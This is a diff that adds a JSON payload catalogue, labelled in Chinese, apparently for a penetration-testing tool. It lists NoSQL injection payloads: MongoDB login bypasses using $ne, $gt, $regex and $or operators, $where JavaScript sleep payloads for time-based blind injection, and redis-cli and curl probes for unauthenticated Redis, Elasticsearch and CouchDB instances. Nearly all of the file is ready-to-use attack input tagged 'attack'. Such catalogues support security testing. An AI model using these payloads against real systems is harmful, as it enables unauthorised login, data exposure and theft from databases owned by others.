@@ -1,0 +1,129 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "NoSQL 注入",
+  "categories": ["MongoDB 认证绕过", "操作符注入", "盲注与时间", "其他 NoSQL", "检测思路"],
+  "items": [
+    {
+      "id": "nosql-mongo-ne",
+      "title": "$ne 认证绕过",
+      "category": "MongoDB 认证绕过",
+      "code": "username=admin&password[$ne]=1",
+      "desc": "把口令参数变为对象，使查询条件恒真，常用于登录绕过测试。",
+      "tags": ["nosql", "mongodb", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-gt",
+      "title": "$gt 认证绕过",
+      "category": "MongoDB 认证绕过",
+      "code": "username=admin&password[$gt]=",
+      "desc": "空字符串比较使任意口令大于空值，从而通过校验。",
+      "tags": ["nosql", "mongodb", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-regex",
+      "title": "$regex 盲匹配",
+      "category": "MongoDB 认证绕过",
+      "code": "username=admin&password[$regex]=^a",
+      "desc": "通过正则逐字符匹配口令，可结合自动化脚本还原口令。",
+      "tags": ["nosql", "mongodb", "regex", "blind"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-where",
+      "title": "$where 执行 JS",
+      "category": "操作符注入",
+      "code": "{\"$where\":\"this.username == 'admin' && sleep(5000)\"}",
+      "desc": "MongoDB 允许 $where 执行 JavaScript，可构造时间盲注。",
+      "tags": ["nosql", "mongodb", "where", "blind"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-or",
+      "title": "$or 条件恒真",
+      "category": "操作符注入",
+      "code": "{\"username\":\"admin\",\"$or\":[{\"password\":\"x\"},{\"password\":{\"$ne\":\"x\"}}]}",
+      "desc": "在 JSON body 中注入 $or，与原条件并列；第二个分支用 $ne 使条件恒真。",
+      "tags": ["nosql", "mongodb", "or"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-where-sleep",
+      "title": "$where 时间盲注",
+      "category": "盲注与时间",
+      "code": "{\"$where\":\"sleep(5000)\"}",
+      "desc": "最简时间探测：部分版本的 $where 可直接调用 sleep，响应整体延迟即说明服务端执行了 JS；若被禁用可换用计算密集型表达式。",
+      "tags": ["nosql", "mongodb", "time", "blind"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-ne-json",
+      "title": "JSON Body 注入",
+      "category": "操作符注入",
+      "code": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+      "desc": "当接口接收 JSON 时，直接把字段值替换为对象。",
+      "tags": ["nosql", "mongodb", "json"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-redis-unauth",
+      "title": "Redis 未授权连接",
+      "category": "其他 NoSQL",
+      "code": "redis-cli -h {{target}} -p 6379 info",
+      "desc": "Redis 默认无认证，info 可确认是否可直接访问。",
+      "tags": ["nosql", "redis", "unauth"],
+      "vars": ["target"],
+      "risk": "attack",
+      "source": "Redis 官方文档"
+    },
+    {
+      "id": "nosql-elastic-unauth",
+      "title": "Elasticsearch 未授权",
+      "category": "其他 NoSQL",
+      "code": "curl http://{{target}}:9200/_cat/indices?v",
+      "desc": "确认 ES 是否暴露且无认证，可进一步读取索引数据。",
+      "tags": ["nosql", "elasticsearch", "unauth"],
+      "vars": ["target"],
+      "risk": "attack",
+      "source": "Elasticsearch 官方文档"
+    },
+    {
+      "id": "nosql-couch-unauth",
+      "title": "CouchDB 未授权",
+      "category": "其他 NoSQL",
+      "code": "curl http://{{target}}:5984/_all_dbs",
+      "desc": "列出全部数据库，判断 CouchDB 是否对外开放。",
+      "tags": ["nosql", "couchdb", "unauth"],
+      "vars": ["target"],
+      "risk": "attack",
+      "source": "CouchDB 官方文档"
+    },
+    {
+      "id": "nosql-detect-type",
+      "title": "参数类型混淆探测",
+      "category": "检测思路",
+      "code": "username=admin&password[$ne]=1 与 username=admin&password=1 对比响应差异",
+      "desc": "对比对象与字符串输入的响应差异，判断后端是否直接使用参数对象。",
+      "tags": ["nosql", "detect", "logic"],
+      "vars": [],
+      "risk": "low",
+      "source": "OWASP NoSQL Injection"
+    }
+  ]
+}
